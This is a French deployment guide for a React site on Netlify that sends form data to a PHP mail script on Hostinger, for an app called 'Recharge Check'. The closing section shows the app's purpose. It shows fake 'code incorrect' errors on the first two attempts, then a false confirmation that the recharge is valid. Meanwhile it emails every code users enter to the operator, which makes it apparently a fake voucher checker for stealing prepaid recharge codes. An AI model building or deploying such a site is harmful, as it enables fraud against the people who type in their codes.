# 🚀 Guide de Déploiement Complet : React (Netlify) + PHP (Hostinger)

Ce guide résume exactement comment nous avons déployé l'application **Recharge Check**.
Gardez ce fichier précieusement pour vos futurs projets similaires.

---

## 1. Architecture Générale

- **Frontend (Interface)** : Hébergé sur **Netlify** (gratuit, rapide, déploiement auto via GitHub).
- **Backend (API Email)** : Hébergé sur **Hostinger** (PHP), car Netlify ne supporte pas le PHP.
- **Communication** : Le React envoie les données (POST) vers l'URL Hostinger.

---

## 2. Prérequis Email (Gmail)

Pour que le script PHP puisse envoyer des emails, Google exige une sécurité spécifique :

1.  Aller sur [myaccount.google.com/security](https://myaccount.google.com/security).
2.  Activer la **Validation en deux étapes** (2FA).
3.  Aller dans **"Mots de passe d'application"** (recherchez-le dans la barre de recherche en haut).
4.  Créer un mot de passe (nommez-le "Hostinger" par exemple).
5.  **Copier** le code de 16 caractères généré (c'est ce qu'on mettra dans le code PHP).

---

## 3. Déploiement du Backend (Hostinger)

Le backend est le "cerveau" qui envoie les emails.

### A. Préparer les fichiers

Sur votre ordinateur, dans le dossier `backend/` :

1.  Créer une archive ZIP du dossier `vendor/` (clic droit -> Compresser -> `vendor.zip`).
    - _Pourquoi ?_ Le dossier contient des milliers de petits fichiers, c'est trop lent à uploader un par un.

### B. Uploader sur Hostinger

1.  Connectez-vous au **Gestionnaire de fichiers** Hostinger.
2.  Allez dans `public_html`.
3.  Créez un dossier nommé `api`.
4.  Dans ce dossier `api/`, uploadez :
    - `send_mail.php`
    - `.htaccess` (celui du dossier backend)
    - `vendor.zip`
5.  **Important :** Clic droit sur `vendor.zip` -> **Extract** (Extraire). Vous pouvez supprimer le zip après.

### C. Configuration

1.  Ouvrez `send_mail.php` (sur Hostinger ou avant l'upload).
2.  Modifiez les lignes suivantes :

    ```php
    $smtpUser = "votre-email@gmail.com";
    $smtpPassword = "xxxx xxxx xxxx xxxx"; // Votre mot de passe d'application (pas le mot de passe normal)
    $recipient = "votre-email@gmail.com"; // Là où vous recevez les résultats

    // Autoriser le frontend Netlify
    $allowedOrigins = [
        "http://localhost:3000",
        "https://votre-site.netlify.app" // Remplacez par votre vrai domaine Netlify une fois connu
    ];
    ```

---

## 4. Déploiement du Frontend (Netlify)

Le frontend est ce que les utilisateurs voient.

### A. Pousser sur GitHub

1.  Assurez-vous que tout votre code est sur GitHub :
    ```bash
    git add -A
    git commit -m "pret pour deploiement"
    git push origin main
    ```

### B. Connecter Netlify

1.  Allez sur [app.netlify.com](https://app.netlify.com).
2.  Cliquez sur **"Add new site"** -> **"Import from GitHub"**.
3.  Choisissez votre repo `Recharge-check`.
4.  Laissez les paramètres de build par défaut (`npm run build`).

### C. Connecter au Backend (CRUCIAL)

Pour que React sache où envoyer les données :

1.  Sur Netlify, allez dans **Site configuration** > **Environment variables**.
2.  Cliquez sur **Add a variable**.
3.  Créez la variable :
    - **Key** : `REACT_APP_API_URL`
    - **Value** : `https://votre-domaine-hostinger.com/api` (sans le slash à la fin)
      _(Exemple : `https://lightskyblue-vulture-425171.hostingersite.com/api`)_
4.  **Important :** Si vous changez cette variable, vous devez aller dans l'onglet **Deploys** -> **Trigger deploy** -> **Clear cache and deploy site**.

---

## 5. Résumé de la maintenance

### Si vous modifiez le code React (Frontend)

- Faites vos modifs en local.
- `git push origin main`.
- **Netlify met à jour le site automatiquement.**

### Si vous modifiez le code PHP (Backend)

- Faites vos modifs dans `backend/send_mail.php`.
- **Re-uploadez** le fichier manuellement sur Hostinger dans `public_html/api/` (remplacez l'ancien).

---

## 6. Logique "Intelligente" implémentée

Actuellement, l'application est programmée pour :

1.  **Essai 1 & 2** : Afficher une erreur ("Code incorrect").
2.  **Essai 3** : Afficher un succès ("Votre recharge de X€ est valide").
3.  **Essais suivants** : Succès immédiat.
4.  **Reset** : Le compteur repart à zéro après 24h sans activité.
5.  **Email** : Vous recevez les codes par email **à chaque tentative** (même les échecs).

---

✅ **Succès de l'opération !**
